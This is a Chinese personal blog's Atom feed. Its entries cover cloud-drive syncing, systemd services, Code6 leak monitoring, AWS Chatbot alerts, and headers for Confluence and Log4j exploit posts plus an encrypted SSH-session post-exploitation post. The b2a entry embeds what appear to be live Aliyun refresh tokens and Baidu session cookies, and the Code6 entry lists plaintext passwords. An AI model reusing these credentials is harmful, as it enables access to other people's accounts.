<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mr.Frame</title>
  
  <subtitle>subtitle</subtitle>
  <link href="https://askding.github.io/atom.xml" rel="self"/>
  
  <link href="https://askding.github.io/"/>
  <updated>2022-02-01T10:12:37.000Z</updated>
  <id>https://askding.github.io/</id>
  
  <author>
    <name>Mr.Frame</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>关于同步盘的一些方案</title>
    <link href="https://askding.github.io/Tools/%E5%85%B3%E4%BA%8E%E5%90%8C%E6%AD%A5%E7%9B%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%A1%88.html"/>
    <id>https://askding.github.io/Tools/%E5%85%B3%E4%BA%8E%E5%90%8C%E6%AD%A5%E7%9B%98%E7%9A%84%E4%B8%80%E4%BA%9B%E6%96%B9%E6%A1%88.html</id>
    <published>2022-02-01T10:12:37.000Z</published>
    <updated>2022-02-01T10:12:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="同步sync"><a href="#同步sync" class="headerlink" title="同步sync"></a>同步sync</h1><h2 id="百度云-—-gt-阿里云盘"><a href="#百度云-—-gt-阿里云盘" class="headerlink" title="百度云 —&gt; 阿里云盘"></a>百度云 —&gt; 阿里云盘</h2><h3 id="利用yaronzz-BaiduYunToAliYun-即可实现"><a href="#利用yaronzz-BaiduYunToAliYun-即可实现" class="headerlink" title="利用yaronzz/BaiduYunToAliYun 即可实现"></a>利用<a href="https://github.com/yaronzz/BaiduYunToAliYun">yaronzz/BaiduYunToAliYun</a> 即可实现</h3><p> <code>token/cookie</code>获取</p><ol><li>阿里云<code>refresh_token</code>获取<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220416095719.png"></li><li>百度盘<code>cookie</code>获取<br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220416100301.png"></li></ol><pre><code class="shell">pip3 install b2a --upgradeb2a -a &quot;&lt;ali_refresh_token&gt;&quot;b2a -b &quot;baidu_cookies&quot; b2a -f &quot;/&quot;  -t &quot;/BaiDu&quot;</code></pre><h3 id="b2a配置文件认证信息"><a href="#b2a配置文件认证信息" class="headerlink" title="b2a配置文件认证信息"></a>b2a配置文件认证信息</h3><pre><code class="shell">cat &lt;&lt;EOF &gt; ~/b2a/auth.json&#123;&quot;ali-refresh_token&quot;: &quot;ae253a9107ea420ebfac4eb768142bb5&quot;, &quot;bdy-cookies&quot;: &quot;BIDUPSID=1689F7B461CC0E9C52F12B6BFB6A338F; PSTM=1647073439; PANWEB=1; BAIDUID=1689F7B461CC0E9C52F12B6BFB6A338F:SL=0:NR=10:FG=1; secu=1; BDUSS=kNLWGtOQ3FuN204UU9qY1U4UGJvSmQyN0VidDJOLTlMYW9Vb3dtanRFNUdnWHBpRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEb0UmJG9FJiU; BDUSS_BFESS=kNLWGtOQ3FuN204UU9qY1U4UGJvSmQyN0VidDJOLTlMYW9Vb3dtanRFNUdnWHBpRVFBQUFBJCQAAAAAAAAAAAEAAABlgi8TcXE3NDE0NzQ1OTYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEb0UmJG9FJiU; STOKEN=7827cfa835e2d55a9c7a5be98df1e12e685f836295666013c2802f7b3983fa05; SCRC=7a20d4e131f1f62f59df7bf2a44a54c9; RT=\&quot;z=1&amp;dm=baidu.com&amp;si=tt4cn8zgmy&amp;ss=l1z3c1fp&amp;sl=4&amp;tt=3lm&amp;bcn=https://fclog.baidu.com/log/weirwood?type=perf&amp;ld=6vo&amp;cl=dfu&amp;ul=kf5&amp;hd=kfi\&quot;; BAIDUID_BFESS=3B52D998848FA0E8B156B63A5126C170:FG=1; csrfToken=gKO-SRJWqAlt7XT9eLasiYy1; BDCLND=NEJdXEDrxfGN7ZPEfNIpeVClSbQ8ESNP; H_PS_PSSID=36175_31660_34812_36167_34584_36122_36277_36125_35864_36226_26350_35724_36102_36061; ndut_fmt=8B0D77DBC872794E85285409CEFEA0CD13623C1299B9CDA79916989D73569A6C; ab_sr=1.0.1_OTFkMTM5NjAxYTY0ZTRiY2M3M2NkODFlMDY0ZjM0YWEyZDIxMDE1MzVmNGUxNmQ0ZGZiZWM5NTk5OWYxZDZmOTU0NjAxNzQxNzczOTJjY2IxYWJhNDE1M2FkYzE0MWJlZjVjOWU3Y2FkMjAzYzU3ZDE1M2Y2Y2NjM2RmY2IzY2Y2OGU4MTYzYjdkNzlhOTFiZGFhZDE0YjEzZjk2ZWUyYQ==; PANPSC=17250608177919035327:CU2JWesajwB3OVK+W4jA5KPTzGELv+1dq7qxW58SMTAwV13IojYjLUci2O0YbEjp7R2km3p1TIG4lUanlzCLQaKK/FH5WUxXYwBzCbaY2H6Ac/axOKu0XZNBoZ8i0CTW8pfgMw2m/oeGDMyMjs7itnzWX47O8AWwA7Z48hYGgW3ajUyYmLmFn1t8VXlRfZV&quot;, &quot;dl-path&quot;: null&#125; </code></pre><h2 id="阿里云盘–-gt-Webdav"><a href="#阿里云盘–-gt-Webdav" class="headerlink" title="阿里云盘–&gt;Webdav"></a>阿里云盘–&gt;Webdav</h2><h3 id="阿里云盘WebDAV共享，支持本地挂载、同步-sleele的博客"><a href="#阿里云盘WebDAV共享，支持本地挂载、同步-sleele的博客" class="headerlink" title="阿里云盘WebDAV共享，支持本地挂载、同步 | sleele的博客"></a><a href="https://sleele.com/2021/08/03/webdav-aliyundriver/">阿里云盘WebDAV共享，支持本地挂载、同步 | sleele的博客</a></h3><h2 id="阿里云盘-–-gt-本地硬盘"><a href="#阿里云盘-–-gt-本地硬盘" class="headerlink" title="阿里云盘 –&gt; 本地硬盘"></a>阿里云盘 –&gt; 本地硬盘</h2><h3 id="CloudDrive-—-将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！-马小帮-maxiaobang-com"><a href="#CloudDrive-—-将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！-马小帮-maxiaobang-com" class="headerlink" title="CloudDrive — 将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！ | 马小帮 (maxiaobang.com)"></a><a href="https://www.maxiaobang.com/10786.html">CloudDrive — 将阿里云盘变成电脑本地磁盘，网盘挂载映射为本地磁盘！ | 马小帮 (maxiaobang.com)</a></h3><p><a href="https://github.com/spinnaker/clouddriver">spinnaker/clouddriver: read and write operations across cloud providers</a></p><h2 id="阿里云盘–-gt-同步盘"><a href="#阿里云盘–-gt-同步盘" class="headerlink" title="阿里云盘–&gt; 同步盘"></a>阿里云盘–&gt; 同步盘</h2><h3 id="修复bug-·-yxhpy-同步阿里盘-Gitee-com"><a href="#修复bug-·-yxhpy-同步阿里盘-Gitee-com" class="headerlink" title="修复bug · yxhpy/同步阿里盘 - Gitee.com"></a><a href="https://gitee.com/yxhpy/sync-alidisk/releases/v1.1.1">修复bug · yxhpy/同步阿里盘 - Gitee.com</a></h3><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;同步sync&quot;&gt;&lt;a href=&quot;#同步sync&quot; class=&quot;headerlink&quot; title=&quot;</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>linux如何添加自定义服务</title>
    <link href="https://askding.github.io/Tools/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1.html"/>
    <id>https://askding.github.io/Tools/linux%E5%A6%82%E4%BD%95%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1.html</id>
    <published>2022-01-27T10:08:19.000Z</published>
    <updated>2022-01-27T10:08:19.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="linux如何添加自定义服务-service命令"><a href="#linux如何添加自定义服务-service命令" class="headerlink" title="linux如何添加自定义服务-service命令"></a>linux如何添加自定义服务-service命令</h1><h2 id="添加配置"><a href="#添加配置" class="headerlink" title="添加配置"></a>添加配置</h2><pre><code class="bash">cat &lt;&lt;EOF &gt;/etc/systemd/system/clash.service[Unit]Description=Clash serviceAfter=network.target[Service]Type=simpleUser=skyleeExecStart=/usr/bin/clashRestart=on-failureRestartPreventExitStatus=23[Install]WantedBy=multi-user.target</code></pre><h2 id="服务操作"><a href="#服务操作" class="headerlink" title="服务操作"></a>服务操作</h2><pre><code class="bash">systemctl list-units --type=service # 查看已识别的服务systemctl daemon-reload   # 让系统重新读取服务service &lt;service-name&gt; start/restart/stop</code></pre><h2 id="启-禁用开机自启"><a href="#启-禁用开机自启" class="headerlink" title="启/禁用开机自启"></a>启/禁用开机自启</h2><pre><code class="shell">systemctl enable/disable &lt;service-name&gt;</code></pre><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;linux如何添加自定义服务-service命令&quot;&gt;&lt;a href=&quot;#linux如何添加自定义服务-s</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>源码监控系统code6搭建</title>
    <link href="https://askding.github.io/Tools/%E6%BA%90%E7%A0%81%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9Fcode6%E6%90%AD%E5%BB%BA.html"/>
    <id>https://askding.github.io/Tools/%E6%BA%90%E7%A0%81%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9Fcode6%E6%90%AD%E5%BB%BA.html</id>
    <published>2022-01-23T08:29:37.000Z</published>
    <updated>2022-01-23T08:29:37.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="GitHub代码泄露监控快速实践"><a href="#GitHub代码泄露监控快速实践" class="headerlink" title="GitHub代码泄露监控快速实践"></a>GitHub代码泄露监控快速实践</h1><h2 id="Code6docker快速部署"><a href="#Code6docker快速部署" class="headerlink" title="Code6docker快速部署"></a><a href="https://www.freebuf.com/articles/es/273357.html">Code6</a>docker快速部署</h2><pre><code class="bash">yum install -y docker git    # 安装docker和gitgit clone git clone https://github.com/4x99/code6.git  /opt/code6 ; # 下载code6源码cd /opt/code6 ; docker build -t code6 .   # 构建docker镜像docker run --name mysqldb -e MYSQL_ROOT_PASSWORD=code6@2022 -d mysql  # 启动mysqldocker inspect mysqldb | grep IPAddress     # 查看数据库容器的内部IP   docker exec -it mysqldb  /bin/bash          # 进入mysql容器    mysql -h 172.17.0.2 -u root -p code6@2022     # 登录mysql数据库    ALTER USER &#39;root&#39; IDENTIFIED WITH  mysql_native_password  BY  &#39;code6@2021&#39;; # 修改mysql数据库密码    create database code6;   # 创建code6数据库    FLUSH PRIVILEGES;        # 刷新权限    exit;                    # 退出mysql数据库docker run -d -p 60080:80 \  # 启动code6-server容器    -e MYSQL_HOST=172.17.0.2 \      -e MYSQL_PORT=3306 \      -e MYSQL_DATABASE=code6 \      -e MYSQL_USERNAME=root \      -e MYSQL_PASSWORD=code6@2022 \     --restart=always   \    --name code6-server code6docker exec -it code6-server /bin/bash   # 进入code6-server容器php artisan code6:user-list              # 查看用户php artisan code6:user-add  sec@upex.co Sec@upex.co2022  # 添加用户</code></pre><p>访问 http://<ip>:60080 即可</p><h2 id="配置使用"><a href="#配置使用" class="headerlink" title="配置使用"></a>配置使用</h2><h3 id="令牌配置"><a href="#令牌配置" class="headerlink" title="令牌配置"></a>令牌配置</h3><h3 id="任务配置"><a href="#任务配置" class="headerlink" title="任务配置"></a>任务配置</h3><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;GitHub代码泄露监控快速实践&quot;&gt;&lt;a href=&quot;#GitHub代码泄露监控快速实践&quot; class=</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>如何利用ssh-session会话实现免密免key登录jumpserver及利用</title>
    <link href="https://askding.github.io/Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8ssh-session%E4%BC%9A%E8%AF%9D%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E5%85%8Dkey%E7%99%BB%E5%BD%95jumpserver%E5%8F%8A%E5%88%A9%E7%94%A8.html"/>
    <id>https://askding.github.io/Kali/PostExploit/%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8ssh-session%E4%BC%9A%E8%AF%9D%E5%AE%9E%E7%8E%B0%E5%85%8D%E5%AF%86%E5%85%8Dkey%E7%99%BB%E5%BD%95jumpserver%E5%8F%8A%E5%88%A9%E7%94%A8.html</id>
    <published>2022-01-18T05:08:49.000Z</published>
    <updated>2022-01-18T05:08:49.000Z</updated>
    
    <content type="html"><![CDATA[<script src=/js/crypto-js.js></script><script>function doDecrypt (pwd, onError) {console.log('in doDecrypt');const txt = document.getElementById('enc_content').innerHTML;let plantext;try {const bytes = CryptoJS.AES.decrypt(txt, pwd);var plaintext = bytes.toString(CryptoJS.enc.Utf8);} catch(err) {if(onError) {onError(err);}return;}document.getElementById('enc_content').innerHTML = plaintext;document.getElementById('enc_content').style.display = 'block';document.getElementById('enc_passwd').style.display = 'none';if(typeof MathJax !== 'undefined') {MathJax.Hub.Queue(['resetEquationNumbers', MathJax.InputJax.TeX],['PreProcess', MathJax.Hub],['Reprocess', MathJax.Hub]);}}</script><div id="enc_content" style="display:none">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</div><div id="enc_passwd"> <input id="enc_pwd_input" type="password" style="border-radius: 5px;border-style: groove;height: 30px;width: 50%;cursor: auto;font-size: 102%;color: currentColor;outline: none;text-overflow: initial;padding-left: 5px;" onkeydown="if (event.keyCode == 13) { decrypt(); return false;}"> <input type="submit" value="解&nbsp;密" onclick="decrypt()" style="width: 58px;height: 34px;border-radius: 5px;background-color: white;border-style: solid;color: currentColor;"><div id="enc_error" style="display: inline-block;color: #d84527;margin-left: 10px"></div><script>var onError = function(error) {document.getElementById("enc_error").innerHTML = "password error!"};function decrypt() {var passwd = document.getElementById("enc_pwd_input").value;console.log(passwd);doDecrypt(passwd, onError);}</script></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;script src=/js/crypto-js.js&gt;&lt;/script&gt;
&lt;script&gt;
function doDecrypt (pwd, onError) {
	console.log(&#39;in doDecrypt&#39;);
	const txt = document.getE</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
    
    
  </entry>
  
  <entry>
    <title>Confluence-CVE2021-26084</title>
    <link href="https://askding.github.io/Kali/Exploit/Confluence-CVE2021-26084.html"/>
    <id>https://askding.github.io/Kali/Exploit/Confluence-CVE2021-26084.html</id>
    <published>2022-01-17T08:57:39.000Z</published>
    <updated>2022-01-17T08:57:39.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20220117165653.png"></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/crkmythical/P</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>awschatbot_slack集成</title>
    <link href="https://askding.github.io/Tools/awschatbot-slack%E9%9B%86%E6%88%90.html"/>
    <id>https://askding.github.io/Tools/awschatbot-slack%E9%9B%86%E6%88%90.html</id>
    <published>2021-12-20T04:08:47.000Z</published>
    <updated>2021-12-20T04:08:47.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="AWS告警通知与Slack集成"><a href="#AWS告警通知与Slack集成" class="headerlink" title="AWS告警通知与Slack集成"></a>AWS告警通知与Slack集成</h1><blockquote><p>前提：Slack channel中已添加AWS Chatbot应用</p></blockquote><h2 id="配置AWS-SNS服务"><a href="#配置AWS-SNS服务" class="headerlink" title="配置AWS SNS服务"></a>配置<a href="https://ap-northeast-1.console.aws.amazon.com/sns/v3/home?region=ap-northeast-1#/dashboard">AWS SNS</a>服务</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220110106.png"></p><h2 id="配置AWS-Chatbot"><a href="#配置AWS-Chatbot" class="headerlink" title="配置AWS Chatbot"></a>配置<a href="https://us-east-2.console.aws.amazon.com/chatbot/home#/">AWS Chatbot</a></h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220104434.png"></p><p>第7步配置好SNS服务时再进行第八步</p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220105454.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220110835.png"></p><h2 id="配置AWS-Cloudwatch通知服务"><a href="#配置AWS-Cloudwatch通知服务" class="headerlink" title="配置AWS Cloudwatch通知服务"></a>配置AWS Cloudwatch通知服务</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220111056.png"></p><h2 id="测试告警"><a href="#测试告警" class="headerlink" title="测试告警"></a>测试告警</h2><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211220111807.png"></p><h1 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h1><h2 id="添加了-频道-ID-后，在AWS-Chatbot的Channel中显示不出来频道的名字"><a href="#添加了-频道-ID-后，在AWS-Chatbot的Channel中显示不出来频道的名字" class="headerlink" title="添加了 频道 ID 后，在AWS Chatbot的Channel中显示不出来频道的名字"></a>添加了 频道 ID 后，在AWS Chatbot的Channel中显示不出来频道的名字</h2><p>需在Slack的频道内添加应用 <strong>AWS Chatbot</strong></p><h2 id="通过cloudwatch观察发送记录的日志，报错："><a href="#通过cloudwatch观察发送记录的日志，报错：" class="headerlink" title="通过cloudwatch观察发送记录的日志，报错："></a>通过cloudwatch观察发送记录的日志，报错：</h2><pre><code>Encountered error while sending message to Slack: Slack Web API returned unsuccessful response ( ok: false, error code: channel_not_found, full response body: ChatPostMessageResponse(ok=false, warning=null, error=channel_not_found, needed=null, provided=null, deprecatedArgument=null, responseMetadata=null, channel=null, ts=null, message=null)).</code></pre><p>需在Slack的频道内添加应用 <strong>AWS Chatbot</strong></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;AWS告警通知与Slack集成&quot;&gt;&lt;a href=&quot;#AWS告警通知与Slack集成&quot; class=&quot;h</summary>
      
    
    
    
    <category term="Tools" scheme="https://askding.github.io/categories/Tools/"/>
    
    
  </entry>
  
  <entry>
    <title>Apache_Log4j_RCE</title>
    <link href="https://askding.github.io/Kali/Exploit/Apache-Log4j-RCE.html"/>
    <id>https://askding.github.io/Kali/Exploit/Apache-Log4j-RCE.html</id>
    <published>2021-12-10T05:31:59.000Z</published>
    <updated>2021-12-10T05:31:59.000Z</updated>
    
